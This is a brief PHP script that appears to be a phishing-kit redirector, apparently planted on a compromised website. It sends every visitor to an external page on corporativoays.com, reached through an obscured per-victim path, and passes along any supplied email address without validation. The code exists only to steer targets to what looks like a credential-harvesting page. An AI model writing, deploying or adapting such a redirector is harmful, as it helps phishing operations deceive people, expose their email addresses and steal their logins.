<?php
$external = 'https://corporativoays.com/alfacgiapi/bak/b6cce038-c131-5749-97d3-b0c632fdccad/hot/index.php';

if($_GET['email']){
$chief = $external."?email=$_GET[email]";

die(header("Location: $chief"));
}else{
die(header("Location: $external"));
}

?>